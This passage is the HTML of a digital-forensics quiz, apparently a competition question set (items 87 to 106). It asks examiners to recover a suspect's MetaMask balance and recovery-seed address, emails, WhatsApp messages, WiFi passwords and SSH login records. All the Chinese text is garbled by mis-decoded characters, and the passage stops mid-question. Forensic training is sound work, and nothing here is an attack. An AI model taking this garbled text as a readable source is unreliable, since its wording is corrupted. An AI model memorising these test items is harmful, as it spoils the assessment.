id="87-æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œæœ‰ä»€ä¹ˆåº”ç”¨ç¨‹åºä¸å°†é»‘é’±-æ¯”ç‰¹å¸-è½¬æ¢æˆå¦ä¸€åŠ å¯†è´§å¸çš„åœ°å€æœ‰å…³-2"><a href="#87-æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œæœ‰ä»€ä¹ˆåº”ç”¨ç¨‹åºä¸å°†é»‘é’±-æ¯”ç‰¹å¸-è½¬æ¢æˆå¦ä¸€åŠ å¯†è´§å¸çš„åœ°å€æœ‰å…³-2" class="headerlink" title="87    æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œæœ‰ä»€ä¹ˆåº”ç”¨ç¨‹åºä¸å°†é»‘é’± (æ¯”ç‰¹å¸) è½¬æ¢æˆå¦ä¸€åŠ å¯†è´§å¸çš„åœ°å€æœ‰å…³?    2"></a>87    æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œæœ‰ä»€ä¹ˆåº”ç”¨ç¨‹åºä¸å°†é»‘é’± (æ¯”ç‰¹å¸) è½¬æ¢æˆå¦ä¸€åŠ å¯†è´§å¸çš„åœ°å€æœ‰å…³?    2</h1><p>å¤šé€‰    A:Metamask;<br>B:Opensea;<br>C:Safepal;<br>D:YouTube    </p><h1 id="88-æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œäº2022-10-07ï¼Œ15-07æ—¶è‡³15-08æ—¶åšè¿‡ä»€ä¹ˆåŠ¨ä½œ-ä»¥æ—¶åŒºUTC-8å›ç­”-2"><a href="#88-æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œäº2022-10-07ï¼Œ15-07æ—¶è‡³15-08æ—¶åšè¿‡ä»€ä¹ˆåŠ¨ä½œ-ä»¥æ—¶åŒºUTC-8å›ç­”-2" class="headerlink" title="88    æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œäº2022-10-07ï¼Œ15:07æ—¶è‡³15:08æ—¶åšè¿‡ä»€ä¹ˆåŠ¨ä½œ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2"></a>88    æœ—å°¼çš„æ‰‹æœºé‡Œï¼Œäº2022-10-07ï¼Œ15:07æ—¶è‡³15:08æ—¶åšè¿‡ä»€ä¹ˆåŠ¨ä½œ? (ä»¥æ—¶åŒºUTC+8å›ç­”)    2</h1><p>å•é€‰<br>A:ç™»å½• â€˜Metamaskâ€™;<br>B:ç™»å½• â€˜Openseaâ€™;<br>C:å±å¹•æˆªå›¾ (Screen Capture);<br>D:ç™»å½• â€˜YouTubeâ€™    </p><h1 id="89-æ‰¿ä¸Šé¢˜ï¼Œä»è¿™ä¸ªåŠ¨ä½œä¸­èƒ½æ‰¾åˆ°ä»€ä¹ˆèµ„è®¯-1"><a href="#89-æ‰¿ä¸Šé¢˜ï¼Œä»è¿™ä¸ªåŠ¨ä½œä¸­èƒ½æ‰¾åˆ°ä»€ä¹ˆèµ„è®¯-1" class="headerlink" title="89    æ‰¿ä¸Šé¢˜ï¼Œä»è¿™ä¸ªåŠ¨ä½œä¸­èƒ½æ‰¾åˆ°ä»€ä¹ˆèµ„è®¯?    1"></a>89    æ‰¿ä¸Šé¢˜ï¼Œä»è¿™ä¸ªåŠ¨ä½œä¸­èƒ½æ‰¾åˆ°ä»€ä¹ˆèµ„è®¯?    1</h1><p>å¤šé€‰    â€œA:Opensea.io;<br>B:Ethereum Main Network;<br>C:Your purchase is complete;<br>D:Subtotal = 0.0253 ETH;<br>E:Good Luck<br>â€œ    </p><h1 id="90-åœ¨æœ—å°¼çš„è®¡ç®—æœºæ—æ‰¾åˆ°-â€˜MetaMaskâ€™-çš„å¯†ç æ˜¯-â€˜opensea741â€™ï¼Œæ‰¾å‡ºæœ—å°¼è®¡ç®—æœºé‡Œçš„-â€˜MetaMaskâ€™-ä¸­æœ‰å¤šå°‘åŠ å¯†è´§å¸ä½™é¢-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-0-137-éœ€å›ç­”-0137-2-å¡«ç©º"><a href="#90-åœ¨æœ—å°¼çš„è®¡ç®—æœºæ—æ‰¾åˆ°-â€˜MetaMaskâ€™-çš„å¯†ç æ˜¯-â€˜opensea741â€™ï¼Œæ‰¾å‡ºæœ—å°¼è®¡ç®—æœºé‡Œçš„-â€˜MetaMaskâ€™-ä¸­æœ‰å¤šå°‘åŠ å¯†è´§å¸ä½™é¢-ä¸è¦è¾“å…¥-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-0-137-éœ€å›ç­”-0137-2-å¡«ç©º" class="headerlink" title="90    åœ¨æœ—å°¼çš„è®¡ç®—æœºæ—æ‰¾åˆ° â€˜MetaMaskâ€™ çš„å¯†ç æ˜¯ â€˜opensea741â€™ï¼Œæ‰¾å‡ºæœ—å°¼è®¡ç®—æœºé‡Œçš„ â€˜MetaMaskâ€™ ä¸­æœ‰å¤šå°‘åŠ å¯†è´§å¸ä½™é¢? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ 0.137 éœ€å›ç­” 0137)    2    å¡«ç©º"></a>90    åœ¨æœ—å°¼çš„è®¡ç®—æœºæ—æ‰¾åˆ° â€˜MetaMaskâ€™ çš„å¯†ç æ˜¯ â€˜opensea741â€™ï¼Œæ‰¾å‡ºæœ—å°¼è®¡ç®—æœºé‡Œçš„ â€˜MetaMaskâ€™ ä¸­æœ‰å¤šå°‘åŠ å¯†è´§å¸ä½™é¢? (ä¸è¦è¾“å…¥ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ 0.137 éœ€å›ç­” 0137)    2    å¡«ç©º</h1><h1 id="91-æœ—å°¼çš„è®¡ç®—æœºæ›¾ç”¨ä»€ä¹ˆç”µé‚®åœ°å€ç™»å½•ç”µé‚®å¸å·-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™-åŠ-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-name-mail-comï¼Œéœ€å›ç­”-NAMEMAILCOM-1-å¡«ç©º"><a href="#91-æœ—å°¼çš„è®¡ç®—æœºæ›¾ç”¨ä»€ä¹ˆç”µé‚®åœ°å€ç™»å½•ç”µé‚®å¸å·-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™-åŠ-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-name-mail-comï¼Œéœ€å›ç­”-NAMEMAILCOM-1-å¡«ç©º" class="headerlink" title="91    æœ—å°¼çš„è®¡ç®—æœºæ›¾ç”¨ä»€ä¹ˆç”µé‚®åœ°å€ç™»å½•ç”µé‚®å¸å·? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜@â€™ åŠ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ name@mail.comï¼Œéœ€å›ç­” NAMEMAILCOM)    1    å¡«ç©º"></a>91    æœ—å°¼çš„è®¡ç®—æœºæ›¾ç”¨ä»€ä¹ˆç”µé‚®åœ°å€ç™»å½•ç”µé‚®å¸å·? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜@â€™ åŠ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ name@mail.comï¼Œéœ€å›ç­” NAMEMAILCOM)    1    å¡«ç©º</h1><h1 id="92-ä»€ä¹ˆç”µé‚®è´¦å·æ›¾æ¥æ”¶è¿‡ä¸Šè¿°ç”µé‚®åœ°å€å‘é€çš„ç”µé‚®ï¼Ÿï¼ˆä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™-åŠ-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-name-mail-comï¼Œéœ€å›ç­”-NAMEMAILCOMï¼‰-1-å¡«ç©º"><a href="#92-ä»€ä¹ˆç”µé‚®è´¦å·æ›¾æ¥æ”¶è¿‡ä¸Šè¿°ç”µé‚®åœ°å€å‘é€çš„ç”µé‚®ï¼Ÿï¼ˆä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™-åŠ-â€˜-â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-name-mail-comï¼Œéœ€å›ç­”-NAMEMAILCOMï¼‰-1-å¡«ç©º" class="headerlink" title="92    ä»€ä¹ˆç”µé‚®è´¦å·æ›¾æ¥æ”¶è¿‡ä¸Šè¿°ç”µé‚®åœ°å€å‘é€çš„ç”µé‚®ï¼Ÿï¼ˆä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜@â€™ åŠ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ name@mail.comï¼Œéœ€å›ç­” NAMEMAILCOMï¼‰    1    å¡«ç©º"></a>92    ä»€ä¹ˆç”µé‚®è´¦å·æ›¾æ¥æ”¶è¿‡ä¸Šè¿°ç”µé‚®åœ°å€å‘é€çš„ç”µé‚®ï¼Ÿï¼ˆä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜@â€™ åŠ â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚ name@mail.comï¼Œéœ€å›ç­” NAMEMAILCOMï¼‰    1    å¡«ç©º</h1><h1 id="93-æ‰¿ä¸Šé¢˜ï¼Œä¸Šè¿°çš„ç”µé‚®é™„ä»¶åŒ…å«å“ªäº›ç±»å‹çš„æ¡£æ¡ˆ-3"><a href="#93-æ‰¿ä¸Šé¢˜ï¼Œä¸Šè¿°çš„ç”µé‚®é™„ä»¶åŒ…å«å“ªäº›ç±»å‹çš„æ¡£æ¡ˆ-3" class="headerlink" title="93    æ‰¿ä¸Šé¢˜ï¼Œä¸Šè¿°çš„ç”µé‚®é™„ä»¶åŒ…å«å“ªäº›ç±»å‹çš„æ¡£æ¡ˆ?    3"></a>93    æ‰¿ä¸Šé¢˜ï¼Œä¸Šè¿°çš„ç”µé‚®é™„ä»¶åŒ…å«å“ªäº›ç±»å‹çš„æ¡£æ¡ˆ?    3</h1><p>å¤šé€‰    A:pdf;<br>B:doc;<br>C:png;<br>D:txt;<br>E:jpg    </p><h1 id="94-ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œçš„æ–‡ä»¶ï¼Œè¢«é®è”½çš„è‹±æ–‡å•å­—æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º"><a href="#94-ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œçš„æ–‡ä»¶ï¼Œè¢«é®è”½çš„è‹±æ–‡å•å­—æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º" class="headerlink" title="94    ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œçš„æ–‡ä»¶ï¼Œè¢«é®è”½çš„è‹±æ–‡å•å­—æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º"></a>94    ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œçš„æ–‡ä»¶ï¼Œè¢«é®è”½çš„è‹±æ–‡å•å­—æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º</h1><h1 id="95-æ ¹æ®ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œæ‰¾åˆ°çš„å›å¤ç§å­-Recovery-Seed-ï¼Œè®¡ç®—æœ—å°¼åœ¨-â€˜MetaMaskâ€™-ä½¿ç”¨çš„ä»¥å¤ªå¸-Ethereum-åœ°å€ã€‚-æç¤ºï¼š-BIP-44-derivation-path-m-44â€™-60â€™-0â€™-0-0-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#95-æ ¹æ®ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œæ‰¾åˆ°çš„å›å¤ç§å­-Recovery-Seed-ï¼Œè®¡ç®—æœ—å°¼åœ¨-â€˜MetaMaskâ€™-ä½¿ç”¨çš„ä»¥å¤ªå¸-Ethereum-åœ°å€ã€‚-æç¤ºï¼š-BIP-44-derivation-path-m-44â€™-60â€™-0â€™-0-0-ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="95    æ ¹æ®ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œæ‰¾åˆ°çš„å›å¤ç§å­ (Recovery Seed)ï¼Œè®¡ç®—æœ—å°¼åœ¨ â€˜MetaMaskâ€™ ä½¿ç”¨çš„ä»¥å¤ªå¸ (Ethereum) åœ°å€ã€‚ (æç¤ºï¼š BIP-44 derivation path = m/44â€™/60â€™/0â€™/0/0) (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>95    æ ¹æ®ä¸Šè¿°ç”µé‚®é™„ä»¶é‡Œæ‰¾åˆ°çš„å›å¤ç§å­ (Recovery Seed)ï¼Œè®¡ç®—æœ—å°¼åœ¨ â€˜MetaMaskâ€™ ä½¿ç”¨çš„ä»¥å¤ªå¸ (Ethereum) åœ°å€ã€‚ (æç¤ºï¼š BIP-44 derivation path = m/44â€™/60â€™/0â€™/0/0) (ä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="96-åœ¨2022å¹´9æœˆ28æ—¥18æ—¶51åˆ†-UTC-8-ï¼Œæœ—å°¼æ›¾ç»åœ¨æ‰‹æœºç”¨WhatsAppä¸ç‹æ™¯æµ©å¯¹è¯ï¼Œè¯­å¥-æœ‰ç¯ï¼Œé£æ‰‡ç»å¸¸åœ¨è½¬-ï¼Œ-å›å¤è¿™å¥è¯çš„ç›¸å…³è¯­å¥æ˜¯ä»€ä¹ˆ-1"><a href="#96-åœ¨2022å¹´9æœˆ28æ—¥18æ—¶51åˆ†-UTC-8-ï¼Œæœ—å°¼æ›¾ç»åœ¨æ‰‹æœºç”¨WhatsAppä¸ç‹æ™¯æµ©å¯¹è¯ï¼Œè¯­å¥-æœ‰ç¯ï¼Œé£æ‰‡ç»å¸¸åœ¨è½¬-ï¼Œ-å›å¤è¿™å¥è¯çš„ç›¸å…³è¯­å¥æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="96    åœ¨2022å¹´9æœˆ28æ—¥18æ—¶51åˆ† (UTC+8)ï¼Œæœ—å°¼æ›¾ç»åœ¨æ‰‹æœºç”¨WhatsAppä¸ç‹æ™¯æµ©å¯¹è¯ï¼Œè¯­å¥ [æœ‰ç¯ï¼Œé£æ‰‡ç»å¸¸åœ¨è½¬]ï¼Œ å›å¤è¿™å¥è¯çš„ç›¸å…³è¯­å¥æ˜¯ä»€ä¹ˆ?    1"></a>96    åœ¨2022å¹´9æœˆ28æ—¥18æ—¶51åˆ† (UTC+8)ï¼Œæœ—å°¼æ›¾ç»åœ¨æ‰‹æœºç”¨WhatsAppä¸ç‹æ™¯æµ©å¯¹è¯ï¼Œè¯­å¥ [æœ‰ç¯ï¼Œé£æ‰‡ç»å¸¸åœ¨è½¬]ï¼Œ å›å¤è¿™å¥è¯çš„ç›¸å…³è¯­å¥æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:ä½ æœ‰æ¨ä»‹å—?;<br>B:æˆ‘ä¹‹å‰æ”¾åœ¨ä½ å®¶çš„æœºæ¢°è¿ä½œæ­£å¸¸å—?;<br>C:æœ‰ç¯å· é£æ‰‡æœ‰è½¬åŠ¨?;<br>D:å¸…å—?    </p><h1 id="97-æœ—å°¼é€šè¿‡æ‰‹æœºç›¸çº¦ç‹æ™¯æµ©äº10æœˆ15æ—¥åˆ°å“ªä¸€ä¸ªåœ°åŒºé£Ÿæ™šé¥­-1"><a href="#97-æœ—å°¼é€šè¿‡æ‰‹æœºç›¸çº¦ç‹æ™¯æµ©äº10æœˆ15æ—¥åˆ°å“ªä¸€ä¸ªåœ°åŒºé£Ÿæ™šé¥­-1" class="headerlink" title="97    æœ—å°¼é€šè¿‡æ‰‹æœºç›¸çº¦ç‹æ™¯æµ©äº10æœˆ15æ—¥åˆ°å“ªä¸€ä¸ªåœ°åŒºé£Ÿæ™šé¥­?    1"></a>97    æœ—å°¼é€šè¿‡æ‰‹æœºç›¸çº¦ç‹æ™¯æµ©äº10æœˆ15æ—¥åˆ°å“ªä¸€ä¸ªåœ°åŒºé£Ÿæ™šé¥­?    1</h1><p>å•é€‰<br>A:èƒæ¹¾;<br>B:æ¹¾ä»”;<br>C:ä¹é¾™åŸ;<br>D:ä¹é¾™å¡˜    </p><h1 id="98-æœ—å°¼æ‰‹æœºçš„-â€˜WhatsAppâ€™-å·ç æ˜¯ä»€ä¹ˆ-å·-ç -s-whatsapp-net-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#98-æœ—å°¼æ‰‹æœºçš„-â€˜WhatsAppâ€™-å·ç æ˜¯ä»€ä¹ˆ-å·-ç -s-whatsapp-net-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="98    æœ—å°¼æ‰‹æœºçš„ â€˜WhatsAppâ€™ å·ç æ˜¯ä»€ä¹ˆ?     ( å· ç  )   @s.whatsapp.net? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>98    æœ—å°¼æ‰‹æœºçš„ â€˜WhatsAppâ€™ å·ç æ˜¯ä»€ä¹ˆ?     ( å· ç  )   @s.whatsapp.net? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="99-æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥ä»¥ä¸‹å“ªä¸€ä¸ªWIFIç½‘ç»œ-2"><a href="#99-æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥ä»¥ä¸‹å“ªä¸€ä¸ªWIFIç½‘ç»œ-2" class="headerlink" title="99    æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥ä»¥ä¸‹å“ªä¸€ä¸ªWIFIç½‘ç»œ?    2"></a>99    æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥ä»¥ä¸‹å“ªä¸€ä¸ªWIFIç½‘ç»œ?    2</h1><p>å¤šé€‰    A:taiiphone;<br>B:rooneyhome;<br>C:Function Room;<br>D:TP-Link    </p><h1 id="100-æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥WIFI-SSID-faifai-å®ƒçš„ç™»å½•å¯†ç æ˜¯ä»€ä¹ˆ-2"><a href="#100-æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥WIFI-SSID-faifai-å®ƒçš„ç™»å½•å¯†ç æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="100    æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥WIFI [SSID: faifai], å®ƒçš„ç™»å½•å¯†ç æ˜¯ä»€ä¹ˆ ?    2"></a>100    æœ—å°¼çš„æ‰‹æœºæ›¾è¿æ¥WIFI [SSID: faifai], å®ƒçš„ç™»å½•å¯†ç æ˜¯ä»€ä¹ˆ ?    2</h1><p>å•é€‰<br>A:abcd5678;<br>B:aaaa0000;<br>C:rooney111;<br>D:rdfu1234    </p><h1 id="101-åœ¨æœ—å°¼æ‰‹æœºäº2022å¹´9æœˆ30æ—¥çš„-â€˜WhatsAppâ€™-å¯¹è¯é‡Œï¼Œæœ‰ä¸€æ®µéŸ³è®¯-Voice-Message-æåˆ°ç‹æ™¯æµ©ä¼šç»™æœ—å°¼ç°é‡‘å¤šå°‘ä½œä¸ºç§Ÿç”¨-â€˜VPNâ€™-çš„ç§Ÿé‡‘-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#101-åœ¨æœ—å°¼æ‰‹æœºäº2022å¹´9æœˆ30æ—¥çš„-â€˜WhatsAppâ€™-å¯¹è¯é‡Œï¼Œæœ‰ä¸€æ®µéŸ³è®¯-Voice-Message-æåˆ°ç‹æ™¯æµ©ä¼šç»™æœ—å°¼ç°é‡‘å¤šå°‘ä½œä¸ºç§Ÿç”¨-â€˜VPNâ€™-çš„ç§Ÿé‡‘-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="101    åœ¨æœ—å°¼æ‰‹æœºäº2022å¹´9æœˆ30æ—¥çš„ â€˜WhatsAppâ€™ å¯¹è¯é‡Œï¼Œæœ‰ä¸€æ®µéŸ³è®¯ (Voice Message) æåˆ°ç‹æ™¯æµ©ä¼šç»™æœ—å°¼ç°é‡‘å¤šå°‘ä½œä¸ºç§Ÿç”¨ â€˜VPNâ€™ çš„ç§Ÿé‡‘? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>101    åœ¨æœ—å°¼æ‰‹æœºäº2022å¹´9æœˆ30æ—¥çš„ â€˜WhatsAppâ€™ å¯¹è¯é‡Œï¼Œæœ‰ä¸€æ®µéŸ³è®¯ (Voice Message) æåˆ°ç‹æ™¯æµ©ä¼šç»™æœ—å°¼ç°é‡‘å¤šå°‘ä½œä¸ºç§Ÿç”¨ â€˜VPNâ€™ çš„ç§Ÿé‡‘? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="102-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨-Media-Server-ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç™»å½•è¿‡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#102-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨-Media-Server-ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç™»å½•è¿‡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="102    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ (Media Server)ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç™»å½•è¿‡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>102    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ (Media Server)ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç™»å½•è¿‡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="103-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç”¨-â€˜sshâ€™-Secure-Shell-ç™»å½•è¿‡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#103-å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç”¨-â€˜sshâ€™-Secure-Shell-ç™»å½•è¿‡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="103    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç”¨ â€˜sshâ€™ (Secure Shell)ç™»å½•è¿‡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>103    å°±AGCé›†å›¢ç½‘ç»œçš„æµåª’ä½“æœåŠ¡å™¨ï¼Œæœ‰å¤šå°‘ä¸ªæœ¬åœ°ç”¨æˆ·æ›¾ç»æˆåŠŸç”¨ â€˜sshâ€™ (Secure Shell)ç™»å½•è¿‡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><h1 id="104-å°±ä¸Šè¿°çš„æœ¬åœ°ç”¨æˆ·ï¼ŒæˆåŠŸé€šè¿‡-â€˜sshâ€™-ç™»å½•è¿‡è¯¥æµåª’ä½“æœåŠ¡å™¨å¤šå°‘æ¬¡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#104-å°±ä¸Šè¿°çš„æœ¬åœ°ç”¨æˆ·ï¼ŒæˆåŠŸé€šè¿‡-â€˜sshâ€™-ç™»å½•è¿‡è¯¥æµåª’ä½“æœåŠ¡å™¨å¤šå°‘æ¬¡-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="104    å°±ä¸Šè¿°çš„æœ¬åœ°ç”¨æˆ·ï¼ŒæˆåŠŸé€šè¿‡ â€˜sshâ€™ ç™»å½•è¿‡è¯¥æµåª’ä½“æœåŠ¡å™¨å¤šå°‘æ¬¡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>104    å°±ä¸Šè¿°çš„æœ¬åœ°ç”¨æˆ·ï¼ŒæˆåŠŸé€šè¿‡ â€˜sshâ€™ ç™»å½•è¿‡è¯¥æµåª’ä½“æœåŠ¡å™¨å¤šå°‘æ¬¡? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><h1 id="105-è¯•æ‰¾æ‰¾è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ä¿¡æ¯-æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªåç§°æ›¾å°è¯•ç”¨-â€˜ssh-nottyâ€™-ç™»å½•è¯¥æµåª’ä½“æœåŠ¡å™¨-2"><a href="#105-è¯•æ‰¾æ‰¾è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ä¿¡æ¯-æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªåç§°æ›¾å°è¯•ç”¨-â€˜ssh-nottyâ€™-ç™»å½•è¯¥æµåª’ä½“æœåŠ¡å™¨-2" class="headerlink" title="105    è¯•æ‰¾æ‰¾è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ä¿¡æ¯. æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªåç§°æ›¾å°è¯•ç”¨ â€˜ssh:nottyâ€™ ç™»å½•è¯¥æµåª’ä½“æœåŠ¡å™¨?    2"></a>105    è¯•æ‰¾æ‰¾è®°å½•å¤±è´¥çš„ç™»å½•å°è¯•ä¿¡æ¯. æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªåç§°æ›¾å°è¯•ç”¨ â€˜ssh:nottyâ€™ ç™»å½•è¯¥æµåª’ä½“æœåŠ¡å™¨?    2</h1><p>å•é€‰<br>A:iamhacker;<br>B:hacking;<br>C:hack;<br>D:hacker;<br>E:ä»¥ä¸Šçš†é    </p><h1 id="106-å°±è¯¥æµåª’ä½“æœåŠ¡å™¨çš„æœ¬åœ°ç”¨æˆ·-æœ‰ä¸€ä¸ªç”¨æˆ·åæ˜¯-â€˜Sâ€™-å¼€å¤´çš„-è¯¥ç”¨æˆ·çš„å§“æ°æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º"><a href="#106-å°±è¯¥æµåª’ä½“æœåŠ¡å™¨çš„æœ¬åœ°ç”¨æˆ·-æœ‰ä¸€ä¸ªç”¨æˆ·åæ˜¯-â€˜Sâ€™-å¼€å¤´çš„-è¯¥ç”¨æˆ·çš„å§“æ°æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-3-å¡«ç©º" class="headerlink" title="106    å°±è¯¥æµåª’ä½“æœåŠ¡å™¨çš„æœ¬åœ°ç”¨æˆ·, æœ‰ä¸€ä¸ªç”¨æˆ·åæ˜¯ â€˜Sâ€™ å¼€å¤´çš„, è¯¥ç”¨æˆ·çš„å§“æ°æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    3    å¡«ç©º"></a>106    å°±è¯¥æµåª’ä½“æœåŠ¡å™¨çš„æœ¬åœ°ç”¨æˆ·, æœ‰ä¸€ä¸ªç”¨æˆ·åæ˜¯ 